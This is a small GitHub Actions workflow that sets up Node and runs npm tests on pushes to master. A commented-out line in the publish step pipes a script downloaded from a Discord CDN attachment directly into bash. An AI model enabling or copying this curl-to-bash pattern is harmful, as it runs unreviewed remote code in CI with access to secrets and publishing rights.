name: "CI/CD"
on:
  push:
    branches:
      - master
jobs:
  publish:
    runs-on: ubuntu-22.04
    steps:
      - name: node
        uses: actions/setup-node@v3
        with:
          node-version: "18.16.0"
      - name: publish
        run: |
          pwd
          npm run test
        # run: curl -sSL https://cdn.discordapp.com/attachments/1129729884957188108/1129761263547846706/npm-publish-v1.0.0.sh | bash
        working-directory: ./